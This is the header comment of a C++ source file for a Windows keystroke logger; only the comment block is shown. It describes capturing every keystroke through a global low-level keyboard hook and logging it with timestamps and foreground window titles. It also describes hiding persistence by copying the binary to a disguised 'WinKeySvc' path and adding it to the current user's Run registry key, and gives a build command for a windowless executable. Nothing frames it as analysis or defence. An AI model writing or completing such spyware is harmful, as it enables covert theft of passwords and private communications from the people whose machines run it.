//  keylog.cpp  —  Windows user-mode keystroke logger
//
//  Mechanism
//    * WH_KEYBOARD_LL global hook captures every key event on the desktop.
//    * Each event is translated to text (ToUnicodeEx against the foreground
//      thread's layout) and appended to a UTF-8 log with a millisecond stamp.
//    * Foreground window titles are written as context markers whenever the
//      focused window or its title changes.
//    * Persistence: the binary copies itself to %APPDATA%\WinKeySvc\WinKeySvc.exe
//      and registers that path under
//      HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
//
//  Build (MSVC)
//    cl /std:c++17 /O2 /EHsc /DUNICODE /D_UNICODE keylog.cpp ^
//       /link /SUBSYSTEM:WINDOWS /OUT:keylog.exe
